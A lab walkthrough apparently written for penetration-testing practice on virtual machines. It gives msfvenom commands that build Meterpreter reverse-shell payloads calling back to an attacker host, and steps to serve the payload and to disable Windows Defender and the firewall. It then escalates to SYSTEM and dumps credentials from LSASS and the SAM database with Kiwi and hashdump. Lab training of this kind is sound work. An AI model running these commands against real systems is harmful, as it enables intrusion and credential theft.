# Meterpreter

## Escalate Privileges To SYSTEM Using Meterpreter’s Command GETSYSTEM
Gaining SYSTEM privileges on a Windows machine is essential for penetration testers and red teamers to perform advanced post-exploitation tasks like credential dumping and accessing sensitive data. Meterpreter's GETSYSTEM command is a powerful tool for escalating privileges to SYSTEM-level access.

#### Preparation
- Target machine: Windows 10 VM with local administrator privileges
- Attacker machine: Kali Linux VM with Metasploit installed

#### Tasks
- Use MSFVenom to generate a Meterpreter reverse shell payload. Ensure you set the payload to be compatible with the target machine's architecture
- Transfer the payload to the target machine
- Create a Meterpreter listener
- On the target machine, right-click the payload file and select "Run as administrator" to start the reverse shell with elevated privileges
- Within the Meterpreter session, use the `getsystem` command to escalate your privileges to SYSTEM level
- Execute either the `whoami` or `getuid` command

#### Solutions 
1. Get the IPv4 addresses of both VMs and ping each other to ensure network connectivity
2. In Kali Linux, create the reverse shell executable for windows using the following sample command
   ```
   msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Kali_Linux_IP_address> LPORT=4444 -f exe -o /home/kali/Desktop/reverseshell.exe
   ```
3. Start the Metasploit framework using `msfconsole`
4. Set the payload using `set PAYLOAD windows/meterpreter/reverse_tcp`
5. Set the LHOST to the Kali Linux's IP address using `set LHOST <Kali_Linux_IP_address>`
6. Set the LPORT (listening port) to 4444 using `set LPORT 4444`
7. In a separate second terminal, send the file over to the target machine either using a web server or a shared folder in the VM. In this task, a web server is used
8. First, navigate to the Desktop directory in the terminal, and copy the reverse shell executable from the desktop to the web server directory at /var/www/html using the command `sudo cp reverseshell.exe /var/www/html`
9. Before starting the Apache web server, verify its status using `service apache2 status`. If it is currently disabled, run the command `service apache2 start` to activate the web server
10. Disable beforehand the Microsoft Firewall and Protection to prevent auto-deletion of the reverse shell executable once it is downloaded
11. In Windows 10 VM, open a web browser and enter the Kali Linux's IP address with the name of the executable as the following: `192.168.1.14/reverseshell.exe`
12. In Kali Linux VM, since the listening port was configured to port 4444, run the commmand `sudo ufw allow 4444/tcp` in the second terminal to allow incoming TCP traffic
13. In the Kali Linux terminal used for the Metasploit framework, run exploit using `exploit`
14. Back to Windows 10 VM, run the downloaded reverseshell.exe as administrator. This should open a Meterpreter session in Kali Linux
15. In Kali Linux, use the `getsystem` command to escalate the privileges to SYSTEM level
16. Enter `shell` and `whoami` to get `nt authority\system`

<br/>
Sample screenshot of a successful Meterpreter session is shown below: 

![image](https://github.com/user-attachments/assets/e61bc49c-66f1-4a0a-8025-539e6ed14d7d)


## Use Meterpreter To Dump Password Hashes Stored In The SAM Database And LSASS
In cybersecurity, understanding how attackers extract credentials is key to effective defense. Meterpreter, a post-exploitation tool, enables attackers to access compromised Windows systems and extract sensitive data like password hashes. Through Meterpreter, tools like Mimikatz can dump password hashes from LSASS memory and the SAM database

#### References
- [Meterpreter Basics](https://www.offsec.com/metasploit-unleashed/meterpreter-basics/#hashdump)
- [Mimikatz](https://www.offsec.com/metasploit-unleashed/mimikatz/)

#### Tasks
- Launch Metasploit and use an appropriate exploit to gain a Meterpreter session on the Windows 7 virtual machine
- Once you have a Meterpreter session, use the "getsystem" command to escalate privileges to SYSTEM level
- Use the "getuid" command to display the current user's privileges
- Use Mimikatz commands within the Meterpreter session to extract usernames and password hashes from the LSASS memory
- Use the "hashdump" command in Meterpreter to dump password hashes from the SAM database


#### Solutions
1. Since Kiwi is an integration of Mimikatz into Metasploit by providing functionality directly in a Meterpreter session, it requires a 64-bit Meterpreter session to avoid errors such as `ERROR kuhl_m_sekurlsa_acquireLSA ; mimikatz x86 cannot access x64 process`
2. If the reverse shell in the previous Meterpreter task is 32-bit, recreate a new 64-bit reverse shell using the command:
   ```
   msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<Kali_Linux_IP_address> LPORT=4444 -f exe -o /home/kali/Desktop/reverseshell.exe
   ```
3. Move the reverse shell from the Desktop directory into the web server directory (/var/www/html)
4. Download the reverse shell in the Windows 10 VM and run it as an administrator
5. Once a Meterpreter session is available in Kali Linux, run `getsystem` to escalate privileges
6. Confirm you are running as a SYSTEM user using `getuid`. You should see something like `Server username: NT AUTHORITY\SYSTEM`
7. To load Mimikatz in Meterpreter session, use `load kiwi`
8. Use `kiwi_cmd sekurlsa::logonpasswords` to extract credentials from LSASS memory. This will dump usernames and password hashes
9. To dump password hashes from the SAM database, use `hashdump`

Screenshot of how Kiwi is used in a Meterpreter session:
![image](https://github.com/user-attachments/assets/3fbaa79a-b163-43d5-bc50-7bb025b4c288)

Screenshot of how hashdump is used in a Meterpreter session:
![image](https://github.com/user-attachments/assets/5ded7cc0-7b98-4ad2-8e50-a35ff5841958)



